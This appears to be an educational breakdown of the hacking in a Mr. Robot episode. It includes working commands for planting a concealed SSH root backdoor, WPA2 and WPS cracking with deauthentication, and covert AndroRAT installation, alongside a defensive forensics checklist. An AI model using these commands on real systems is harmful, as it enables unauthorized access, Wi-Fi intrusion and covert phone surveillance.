# Episode 7: eps1.6_v1ew-s0urce.flv

## Overview

This episode reveals Tyrell Wellick's own hacking capabilities as he installs an SSH backdoor on E Corp servers to serve his personal ambitions. Meanwhile, Elliot begins to suspect he is being monitored and performs a forensic self-analysis of his own systems. The episode also features Android phone exploitation with physical access and WPA2 Wi-Fi cracking, further demonstrating the range of attack techniques in the show.

---

## Hacks & Techniques

### 1. Tyrell Wellick's SSH Backdoor Installation on E Corp Servers

Tyrell Wellick, E Corp's ambitious CTO candidate, installs an SSH backdoor on the company's servers to maintain unauthorized persistent access. Unlike the external attacks by fsociety, this is an insider threat, someone with legitimate access using their privileges to create hidden, unauthorized access channels.

**SSH backdoor methodology:**

Tyrell leverages his existing administrative access to E Corp's server infrastructure to install a persistent SSH backdoor. This involves modifying the SSH configuration and authentication mechanisms so that he can access the servers at any time, even if his legitimate credentials are revoked.

**Attack components:**

- **Authorized key injection**: Adding his personal SSH public key to the `authorized_keys` file on target servers, allowing passwordless authentication
- **SSH configuration modification**: Altering sshd_config to enable additional access methods, non-standard ports, or disable logging for his sessions
- **Persistence mechanisms**: Ensuring the backdoor survives system updates, key rotations, and security audits
- **Access concealment**: Hiding the backdoor among legitimate authorized keys or in non-standard locations

**Why insider threats are particularly dangerous:**

| Factor | Impact |
|--------|--------|
| Existing access | No need to breach perimeter defenses |
| Knowledge of systems | Knows where sensitive data resides and how to access it |
| Knowledge of security | Knows what is monitored and how to evade detection |
| Trusted identity | Actions may not trigger alerts designed for external threats |
| Physical access | Can access systems, install hardware, or exfiltrate data physically |

### 2. SSH authorized_keys Manipulation

The core of Tyrell's backdoor is manipulation of SSH's authorized_keys authentication mechanism, one of the most common techniques for establishing persistent Linux/Unix access.

**How authorized_keys works:**

SSH public key authentication uses asymmetric cryptography. The user generates a key pair (public and private). The public key is placed on the server in `~/.ssh/authorized_keys`, and the private key is retained by the user. When connecting, the server challenges the client to prove possession of the private key, granting access without a password.

**Backdoor installation:**

```
1. Tyrell generates a new SSH key pair on his personal device
2. He accesses E Corp servers using his legitimate credentials
3. He adds his personal public key to root's authorized_keys file
4. He may also add keys to service accounts for redundancy
5. He modifies file timestamps to avoid suspicion
6. His legitimate access is logged normally; the key addition is not
```

**Advanced authorized_keys techniques:**

- **Command restriction bypass**: The `command=` option in authorized_keys can restrict what a key can do, but improperly configured entries can be exploited
- **From restriction**: The `from=` option limits which IP addresses can use a key, but this can be circumvented through pivoting
- **Multiple key placement**: Adding keys to multiple accounts and multiple servers for redundancy
- **Hidden key files**: Placing authorized_keys files in non-standard locations and configuring sshd to check those locations via `AuthorizedKeysFile` directive

**Detection challenges:**

- Authorized_keys changes are not logged by default in most SSH configurations
- The file is a flat text file with no built-in change auditing
- Keys are opaque strings that do not reveal the holder's identity unless a comment is included
- Automated key management systems are not universally deployed
- Manual audits of authorized_keys files across large server fleets are rare

### 3. Android Phone Exploitation with Physical Access (AndroRAT)

A scene in the episode depicts exploitation of an Android phone when the attacker has brief physical access to the device. The tool referenced is AndroRAT (Android Remote Administration Tool), which provides comprehensive remote access to a compromised Android device.

**AndroRAT capabilities:**

AndroRAT is a client/server application that provides remote control over Android devices. The server (control panel) runs on the attacker's machine, while the client (malicious APK) runs on the target device.

**Features:**

| Capability | Description |
|-----------|-------------|
| Contact retrieval | Access the device's contact list |
| Call log access | View incoming, outgoing, and missed calls |
| SMS access | Read and send text messages |
| GPS location | Real-time GPS tracking |
| Camera access | Remotely capture photos from front/rear cameras |
| Microphone access | Record ambient audio |
| Browser history | View web browsing history |
| File browser | Navigate and download files from the device |
| Live streaming | Stream camera or microphone in real time |
| App listing | View installed applications |
| Shell access | Execute commands on the device |

**Physical access installation process:**

1. **Unlock the device** (if unprotected, or using shoulder-surfed/guessed PIN)
2. **Enable Unknown Sources** in Android settings to allow sideloading
3. **Transfer the malicious APK** via USB, Bluetooth, or web download
4. **Install the APK** and grant requested permissions
5. **Hide the app** from the launcher (rename, disable launcher activity)
6. **Disable Google Play Protect** to prevent detection
7. **Clear installation traces** from download history, notification log, and recent apps
8. **Lock the device** and return it

### 4. Forensic Self-Analysis: Elliot Discovers Monitoring

Elliot suspects that someone is monitoring his activities and performs a forensic analysis of his own systems to detect surveillance. This is a defensive application of the same skills he uses offensively.

**Detection methodology:**

Elliot systematically examines his system for indicators of compromise (IOCs), looking for unauthorized processes, network connections, file modifications, and installed software.

**Key investigation areas:**

- **Process analysis**: Examining all running processes for unfamiliar or suspicious entries, paying attention to process names that mimic legitimate system processes
- **Network connection analysis**: Identifying unexpected outbound connections, particularly to unknown IP addresses, which could indicate data exfiltration or C2 communication
- **File system analysis**: Checking for recently modified files, new files in system directories, and files with suspicious timestamps
- **Startup persistence**: Examining boot scripts, cron jobs, systemd services, and other persistence mechanisms for unauthorized entries
- **User account audit**: Checking for unauthorized user accounts or SSH keys
- **Kernel module inspection**: Looking for loaded kernel modules that could indicate a rootkit

**Behavioral indicators Elliot checks:**

- System slower than usual (CPU/memory consumed by monitoring processes)
- Unexpected disk activity (logging or data staging for exfiltration)
- Network traffic during idle periods (beaconing to C2)
- Modified system utilities (rootkit-replaced binaries)
- Unfamiliar entries in startup configurations

### 5. Network and Process Analysis: netstat, lsof, ps aux

These three commands form the core of Elliot's forensic investigation toolkit for detecting unauthorized activity on his system.

**ps aux - Process analysis:**

Displays all running processes with detailed information including the user, PID, CPU and memory usage, start time, and full command line. Critical for identifying suspicious processes.

**netstat - Network connection analysis:**

Shows active network connections, listening ports, and routing information. Reveals unexpected connections to external hosts that could indicate backdoor communications.

**lsof - List open files:**

Lists all files currently open by any process. On Unix-like systems, "everything is a file," including network connections, so lsof provides a comprehensive view of system activity. It bridges process analysis and network analysis by showing which processes have which files and network connections open.

**Integrated analysis approach:**

```
1. ps aux -> Identify suspicious processes -> Note PIDs
2. lsof -p [PID] -> See what files/connections those processes have open
3. netstat -tulnp -> Correlate network connections with process IDs
4. Cross-reference: Do any processes have unexpected network connections?
5. Investigate: Where do those connections lead? What data is being sent?
```

### 6. WPA2 Wi-Fi Cracking (aircrack-ng, wifite, reaver)

The episode depicts Wi-Fi network security assessment, specifically attacks against WPA2-protected wireless networks using a suite of tools.

**WPA2 attack vectors:**

**Four-way handshake capture and offline cracking:**
1. Place the wireless adapter in monitor mode
2. Identify the target access point and connected clients
3. Send deauthentication frames to force a client to reconnect
4. Capture the WPA2 four-way handshake during reconnection
5. Perform offline dictionary/brute-force attack against the handshake

**WPS (Wi-Fi Protected Setup) PIN attack:**
WPS is a convenience feature that allows connection via an 8-digit PIN. Due to implementation flaws, the PIN space can be reduced from 10^8 to approximately 11,000 attempts, making it brute-forceable in hours.

**PMKID attack (newer technique):**
Discovered in 2018, this attack captures the PMKID from the first message of the four-way handshake, requiring only a single frame and no client deauthentication. The PMKID can then be cracked offline.

**Tools:**

- **aircrack-ng suite**: The foundational Wi-Fi security assessment framework, including airmon-ng (monitor mode), airodump-ng (packet capture), aireplay-ng (packet injection), and aircrack-ng (WPA handshake cracking)
- **wifite**: An automated wireless attack tool that orchestrates aircrack-ng, reaver, and other tools to perform Wi-Fi attacks with minimal manual intervention
- **reaver**: A WPS brute-force attack tool that exploits the WPS PIN vulnerability to recover the WPA/WPA2 passphrase

---

## Tools Used

| Tool | Purpose | Category |
|------|---------|----------|
| SSH / OpenSSH | Backdoor access via authorized_keys | Remote Access |
| AndroRAT | Remote administration tool for Android | Mobile Exploitation |
| ps, lsof, netstat | System forensic analysis | Forensics/Detection |
| aircrack-ng | WPA2 handshake capture and cracking | Wireless Hacking |
| wifite | Automated wireless network attacks | Wireless Hacking |
| reaver | WPS PIN brute-force attack | Wireless Hacking |
| hashcat | GPU-accelerated handshake cracking | Password Cracking |

---

## Commands Shown

### SSH backdoor installation (Tyrell's actions)
```bash
# Generate a new SSH key pair (on attacker's machine)
ssh-keygen -t rsa -b 4096 -f ~/.ssh/ecorp_backdoor -N ""

# On the target E Corp server (using legitimate access):
# Add the public key to root's authorized_keys
echo "ssh-rsa AAAAB3...backdoor_key... tyrell@personal" >> /root/.ssh/authorized_keys

# Set correct permissions (SSH is strict about this)
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh

# Modify timestamp to match other entries and avoid suspicion
touch -r /root/.ssh/known_hosts /root/.ssh/authorized_keys

# Optionally, add a backdoor SSH service on a non-standard port
# Add to /etc/ssh/sshd_config:
# Port 22
# Port 31337  # Additional hidden port

# Alternatively, modify authorized_keys to restrict visibility
# Add key to a service account less likely to be audited
echo "ssh-rsa AAAAB3...key..." >> /home/svc_backup/.ssh/authorized_keys

# Test backdoor access from personal device
ssh -i ~/.ssh/ecorp_backdoor -p 31337 root@ecorp-server.com
```

### Elliot's forensic self-analysis
```bash
# Comprehensive process listing
ps aux --sort=-%mem | head -30

# Search for suspicious process names
ps aux | grep -iE "rat|keylog|monitor|spy|capture|record"

# List all established network connections with process info
netstat -tulnp
netstat -anp | grep ESTABLISHED

# Alternative using ss (socket statistics)
ss -tulnp
ss -tnp state established

# List all open files and network connections for a process
lsof -p [suspicious_PID]

# Show all network connections with associated processes
lsof -i -n -P

# Check for connections to unusual ports
lsof -i -n -P | grep -v ":22\|:80\|:443\|:53"

# Examine recently modified files in system directories
find /usr/bin /usr/sbin /bin /sbin -mtime -7 -type f 2>/dev/null

# Check for unauthorized cron jobs
crontab -l
ls -la /etc/cron.d/
for user in $(cut -f1 -d: /etc/passwd); do
    crontab -u $user -l 2>/dev/null
done

# Inspect loaded kernel modules
lsmod
cat /proc/modules

# Check for unauthorized SSH keys
find / -name "authorized_keys" -exec ls -la {} \; -exec cat {} \; 2>/dev/null

# Review systemd services for unauthorized entries
systemctl list-units --type=service --state=running

# Check for modifications to system binaries
rpm -Va 2>/dev/null  # RPM-based systems
debsums -c 2>/dev/null  # Debian-based systems
```

### WPA2 Wi-Fi cracking
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Scan for available wireless networks
sudo airodump-ng wlan0mon

# Target specific network and capture handshake
sudo airodump-ng -c [channel] --bssid [AP_MAC] -w capture wlan0mon

# Send deauthentication frames to force handshake
sudo aireplay-ng -0 5 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon

# Crack the captured handshake with a wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# GPU-accelerated cracking with hashcat
# Convert cap to hccapx format first
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt

# Automated attack with wifite
sudo wifite --kill

# WPS PIN attack with reaver
sudo reaver -i wlan0mon -b [AP_MAC] -vv

# Capture PMKID (modern attack, no client needed)
sudo hcxdumptool -i wlan0mon --enable_status=1 -o capture.pcapng
sudo hcxpcapngtool -o hash.22000 capture.pcapng
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
```

### AndroRAT deployment (conceptual)
```bash
# Compile AndroRAT APK with C2 server configuration
# Set the server IP and port in the client configuration
# Build the APK

# With physical access to target Android device:
adb install androrat_client.apk

# Or, if no ADB:
# 1. Enable Unknown Sources in Android settings
# 2. Download APK via browser to the device
# 3. Install APK
# 4. Grant all requested permissions
# 5. Hide from launcher

# On the attacker's machine, start the AndroRAT server
java -jar AndroRAT_Server.jar

# Once the target device connects back:
# - View contacts, SMS, call logs
# - Track GPS location in real time
# - Activate camera/microphone
# - Browse device files
# - Execute shell commands
```

---

## Real-World Parallels

### SSH Key-Based Backdoors in Major Breaches
SSH key-based backdoors are a well-documented technique in real-world breaches. During the investigation of the SolarWinds compromise (2020-2021), investigators found that the attackers (attributed to Russian SVR) had added SSH keys to maintain persistent access across compromised systems. The Juniper Networks backdoor incident (2015) revealed that attackers had inserted unauthorized code into Juniper's ScreenOS that allowed SSH access with a hardcoded password. In 2019, a study by Venafi found that 60% of organizations could not detect unauthorized SSH key additions.

### Insider Threats
Tyrell's actions mirror documented insider threat cases. Edward Snowden used his legitimate system administrator access at NSA to access and exfiltrate classified materials. In 2018, a Tesla employee was caught sabotaging the company's manufacturing operating system and exfiltrating data. The Verizon Data Breach Investigations Report consistently identifies insider threats as responsible for approximately 20-30% of data breaches, with privileged users (like Tyrell) being the most dangerous category.

### Android RAT Malware
AndroRAT was a real open-source project originally developed as a university project in France (2012) that became one of the most widely used mobile RATs. It was subsequently weaponized by threat actors worldwide. Commercial and state-sponsored Android RATs have evolved significantly since then: FinFisher (used by governments for lawful interception), Pegasus (NSO Group, used against journalists and activists), and Hermit (RCS Labs, discovered targeting users in Italy and Kazakhstan in 2022).

### WPA2 Security Research
WPA2 vulnerabilities have been extensively researched. The KRACK (Key Reinstallation Attack) vulnerability discovered by Mathy Vanhoef in 2017 (CVE-2017-13077 through CVE-2017-13088) affected virtually every WPA2 implementation. The PMKID attack method (2018) by Jens "atom" Steube simplified WPA2 cracking by eliminating the need to capture a full four-way handshake. These discoveries ultimately drove the development and adoption of WPA3.

### System Self-Analysis and Counter-Surveillance
Elliot's forensic self-analysis mirrors real-world counter-surveillance practices. Security researchers and journalists operating in hostile environments regularly audit their own systems for indicators of compromise. The Committee to Protect Journalists (CPJ) and Access Now's Digital Security Helpline provide guidance on self-analysis techniques. Tools like DETEKT (developed by Amnesty International) were created specifically to help activists and journalists detect known surveillance software on their systems.

---

## Tool Links

- **Aircrack-ng**: https://www.aircrack-ng.org/
- **reaver**: https://github.com/t6x/reaver-wps-fork-t6x
- **wifite**: https://github.com/derv82/wifite2
- **AndroRAT** (successor - AhMyth): https://github.com/AhMyth/AhMyth-Android-RAT
- **Hashcat**: https://hashcat.net/hashcat/
- **OpenSSL**: https://www.openssl.org/

---

## MITRE ATT&CK Mapping

| Episode Technique | MITRE ATT&CK ID | Name | Link |
|---|---|---|---|
| SSH authorized_keys backdoor | T1098 | Account Manipulation | https://attack.mitre.org/techniques/T1098/ |
| SSH backdoor on non-standard port | T1133 | External Remote Services | https://attack.mitre.org/techniques/T1133/ |
| Insider threat - valid account abuse | T1078 | Valid Accounts | https://attack.mitre.org/techniques/T1078/ |
| SSH config modification for persistence | T1547 | Boot or Logon Autostart Execution | https://attack.mitre.org/techniques/T1547/ |
| Timestamp manipulation to hide changes | T1070 | Indicator Removal | https://attack.mitre.org/techniques/T1070/ |
| AndroRAT mobile exploitation | T1219 | Remote Access Software | https://attack.mitre.org/techniques/T1219/ |
| AndroRAT keylogging | T1056 | Input Capture | https://attack.mitre.org/techniques/T1056/ |
| AndroRAT data collection | T1005 | Data from Local System | https://attack.mitre.org/techniques/T1005/ |
| Forensic self-analysis (process discovery) | T1057 | Process Discovery | https://attack.mitre.org/techniques/T1057/ |
| Network connection discovery (netstat) | T1049 | System Network Connections Discovery | https://attack.mitre.org/techniques/T1049/ |
| WPA2 Wi-Fi cracking | T1110 | Brute Force | https://attack.mitre.org/techniques/T1110/ |
| Wi-Fi deauthentication attack | T1498 | Network Denial of Service | https://attack.mitre.org/techniques/T1498/ |
| Network sniffing (Wi-Fi handshake capture) | T1040 | Network Sniffing | https://attack.mitre.org/techniques/T1040/ |

---

## References and Further Reading

- **CVE-2017-13077 (KRACK Attack)**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-13077
- **KRACK Attack Research (Mathy Vanhoef)**: https://www.krackattacks.com/
- **PMKID Attack (hashcat)**: https://hashcat.net/forum/thread-7717.html
- **SolarWinds SSH Key Persistence**: https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html
- **Juniper Networks Backdoor (2015)**: https://kb.juniper.net/InfoCenter/index?page=content&id=JSA10713
- **Venafi SSH Key Management Study (2019)**: https://www.venafi.com/
- **Verizon DBIR - Insider Threats**: https://www.verizon.com/business/resources/reports/dbir/
- **AndroRAT Original Project**: https://github.com/DesignativeDave/androrat
- **Amnesty International - DETEKT Tool**: https://resistsurveillance.org/
- **Access Now - Digital Security Helpline**: https://www.accessnow.org/help/
- **SANS - Wireless Penetration Testing**: https://www.sans.org/white-papers/

---

## Search Tags

```
tags: [SSH backdoor, authorized_keys, insider threat, Tyrell Wellick, AndroRAT, mobile RAT, Android exploitation, forensic analysis, counter-surveillance, ps aux, netstat, lsof, WPA2, aircrack-ng, wifite, reaver, hashcat, KRACK, PMKID, Wi-Fi cracking, WPS, privilege persistence]
season: 1
episode: 7
mitre: [T1098, T1133, T1078, T1547, T1070, T1219, T1056, T1005, T1057, T1049, T1110, T1498, T1040]
```